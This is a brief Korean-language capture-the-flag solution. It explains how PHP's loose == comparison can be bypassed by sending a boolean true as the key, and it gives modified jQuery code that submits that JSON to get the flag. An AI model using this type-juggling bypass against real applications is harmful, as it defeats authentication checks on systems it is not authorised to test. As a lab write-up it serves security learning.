# Solution..!
- php ==의 느슨한 비교 취약점을 이용해야함
- ==로 비교하는 인자에서 true값을 준다면 이는 참으로 판단을 함
- proxy에서 가로채질 못하니 스크립트를 변조해서 사용
```javascript
function submit(key){
	$.ajax({
		type : "POST",
		async : false,
		url : "./index.php",
		data : {json:JSON.stringify({key: true})},
		dataType : 'json'
	}).done(function(result){
		if (result['code'] == true) {
			document.write("Congratulations! flag is " + result['flag']);
		} else {
			alert("nope...");
		}
		lock = false;
	});
}
```